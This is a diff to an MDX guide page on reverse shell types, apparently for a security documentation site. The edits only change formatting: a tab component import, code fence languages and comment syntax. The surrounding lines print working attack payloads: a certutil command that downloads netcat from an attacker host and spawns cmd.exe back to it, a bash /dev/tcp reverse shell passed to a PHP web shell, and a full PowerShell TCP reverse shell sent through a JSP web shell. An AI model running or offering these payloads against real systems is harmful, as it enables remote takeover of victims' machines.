@@ -3,6 +3,8 @@ title: Types of Reverse Shells
 description: Comprehensive guide to different reverse shell implementations across various languages and platforms
 ---
 
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
+
 # Types of Reverse Shells
 
 This section explores the various implementations of reverse shells across different programming languages, command-line utilities, and operating systems. Each type has its own advantages, limitations, and ideal use cases.
@@ -262,7 +264,7 @@ Windows systems require different approaches due to their distinct command shell
 
 ### Command Prompt
 
-```cmd
+```batch
 # Using certutil to download netcat and create a reverse shell
 certutil -urlcache -split -f "http://attacker-ip/nc.exe" C:\Windows\Temp\nc.exe
 C:\Windows\Temp\nc.exe -e cmd.exe attacker-ip 4444
@@ -288,7 +290,7 @@ if(isset($_REQUEST['cmd'])){
 }
 ?>
 
-<!-- Usage: http://target-server/shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/attacker-ip/4444 0>%261' -->
+{/* Usage: http://target-server/shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/attacker-ip/4444 0>%261' */}
 ```
 
 **Key Points:**
@@ -299,7 +301,7 @@ if(isset($_REQUEST['cmd'])){
 
 ### JSP Web Shell
 
-```jsp
+```java
 <%@ page import="java.io.*" %>
 <%
     String cmd = request.getParameter("cmd");
@@ -316,7 +318,7 @@ if(isset($_REQUEST['cmd'])){
     }
 %>
 
-<!-- Usage: http://target-server/shell.jsp?cmd=powershell -c "$client=New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" -->
+{/* Usage: http://target-server/shell.jsp?cmd=powershell -c "$client=New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" */}
 ```
 
 **Key Points:**
